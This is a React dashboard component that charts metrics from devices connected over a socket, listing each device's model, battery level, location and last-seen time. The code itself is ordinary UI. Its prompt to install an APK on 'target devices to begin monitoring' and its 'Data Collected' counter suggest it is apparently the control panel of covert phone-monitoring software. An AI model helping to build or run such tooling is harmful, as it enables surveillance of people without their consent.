import React, { useState, useEffect } from 'react';
import { Line, Bar, Doughnut } from 'react-chartjs-2';
import {
  Chart as ChartJS,
  CategoryScale,
  LinearScale,
  PointElement,
  LineElement,
  BarElement,
  Title,
  Tooltip,
  Legend,
  ArcElement,
} from 'chart.js';

ChartJS.register(
  CategoryScale,
  LinearScale,
  PointElement,
  LineElement,
  BarElement,
  Title,
  Tooltip,
  Legend,
  ArcElement
);

const Dashboard = ({ socket, devices }) => {
  const [metrics, setMetrics] = useState({
    totalDevices: 0,
    activeDevices: 0,
    dataCollected: 0,
    alertsGenerated: 0,
    batteryAverage: 0,
    storageUsed: 0
  });

  const [activityData, setActivityData] = useState({
    labels: [],
    datasets: []
  });

  const [deviceStats, setDeviceStats] = useState({
    labels: ['Active', 'Inactive', 'Maintenance'],
    datasets: [{
      data: [0, 0, 0],
      backgroundColor: ['#00ff88', '#ff4444', '#ffaa00'],
      borderWidth: 0
    }]
  });

  useEffect(() => {
    if (socket) {
      socket.on('metrics_update', (data) => {
        setMetrics(data);
      });

      socket.on('activity_data', (data) => {
        setActivityData(data);
      });

      // Request initial metrics
      socket.emit('request_metrics');
    }
  }, [socket]);

  useEffect(() => {
    if (devices.length > 0) {
      const activeCount = devices.filter(d => d.status === 'active').length;
      const inactiveCount = devices.filter(d => d.status === 'inactive').length;
      const maintenanceCount = devices.filter(d => d.status === 'maintenance').length;

      setDeviceStats({
        labels: ['Active', 'Inactive', 'Maintenance'],
        datasets: [{
          data: [activeCount, inactiveCount, maintenanceCount],
          backgroundColor: ['#00ff88', '#ff4444', '#ffaa00'],
          borderWidth: 0
        }]
      });

      setMetrics(prev => ({
        ...prev,
        totalDevices: devices.length,
        activeDevices: activeCount,
        batteryAverage: Math.round(devices.reduce((acc, d) => acc + (d.battery || 0), 0) / devices.length || 0)
      }));
    }
  }, [devices]);

  const chartOptions = {
    responsive: true,
    maintainAspectRatio: false,
    plugins: {
      legend: {
        labels: {
          color: '#ffffff'
        }
      }
    },
    scales: {
      x: {
        ticks: { color: '#a0a0a0' },
        grid: { color: '#333344' }
      },
      y: {
        ticks: { color: '#a0a0a0' },
        grid: { color: '#333344' }
      }
    }
  };

  const doughnutOptions = {
    responsive: true,
    maintainAspectRatio: false,
    plugins: {
      legend: {
        position: 'bottom',
        labels: {
          color: '#ffffff',
          padding: 20
        }
      }
    }
  };

  return (
    <div className="dashboard fade-in">
      <div className="device-list">
        <h2>🔗 Connected Devices</h2>
        {devices.length === 0 ? (
          <div style={{ textAlign: 'center', padding: '2rem', color: '#a0a0a0' }}>
            <p>No devices connected</p>
            <p style={{ fontSize: '0.8rem', marginTop: '0.5rem' }}>
              Install SpectraTM APK on target devices to begin monitoring
            </p>
          </div>
        ) : (
          devices.map((device, index) => (
            <div key={index} className="device-item">
              <div className="device-info">
                <h3>{device.name || `Device ${device.id}`}</h3>
                <p>📱 {device.model} | 🔋 {device.battery}% | 📍 {device.location || 'Unknown'}</p>
                <p style={{ fontSize: '0.7rem', marginTop: '0.2rem' }}>
                  Last seen: {new Date(device.lastSeen).toLocaleString()}
                </p>
              </div>
              <span className={`device-status ${device.status}`}>
                {device.status === 'active' ? '🟢' : '🔴'} {device.status}
              </span>
            </div>
          ))
        )}
      </div>

      <div className="metrics-panel">
        <h2 style={{ marginBottom: '1.5rem', color: '#00ff88' }}>📊 System Metrics</h2>
        
        <div className="metrics-grid">
          <div className="metric-card">
            <span className="metric-value">{metrics.totalDevices}</span>
            <span className="metric-label">Total Devices</span>
          </div>
          <div className="metric-card">
            <span className="metric-value">{metrics.activeDevices}</span>
            <span className="metric-label">Active Devices</span>
          </div>
          <div className="metric-card">
            <span className="metric-value">{(metrics.dataCollected / 1024 / 1024).toFixed(1)}MB</span>
            <span className="metric-label">Data Collected</span>
          </div>
          <div className="metric-card">
            <span className="metric-value">{metrics.alertsGenerated}</span>
            <span className="metric-label">Alerts Generated</span>
          </div>
          <div className="metric-card">
            <span className="metric-value">{metrics.batteryAverage}%</span>
            <span className="metric-label">Avg Battery</span>
          </div>
          <div className="metric-card">
            <span className="metric-value">{(metrics.storageUsed / 1024 / 1024).toFixed(1)}MB</span>
            <span className="metric-label">Storage Used</span>
          </div>
        </div>

        <div style={{ display: 'grid', gridTemplateColumns: '2fr 1fr', gap: '1rem' }}>
          <div className="chart-container">
            <h3 style={{ marginBottom: '1rem', color: '#00ff88' }}>Activity Timeline</h3>
            {activityData.datasets && activityData.datasets.length > 0 ? (
              <Line data={activityData} options={chartOptions} />
            ) : (
              <div style={{ 
                display: 'flex', 
                alignItems: 'center', 
                justifyContent: 'center', 
                height: '100%', 
                color: '#a0a0a0' 
              }}>
                No activity data available
              </div>
            )}
          </div>
          
          <div className="chart-container">
            <h3 style={{ marginBottom: '1rem', color: '#00ff88' }}>Device Status</h3>
            <Doughnut data={deviceStats} options={doughnutOptions} />
          </div>
        </div>
      </div>
    </div>
  );
};

export default Dashboard;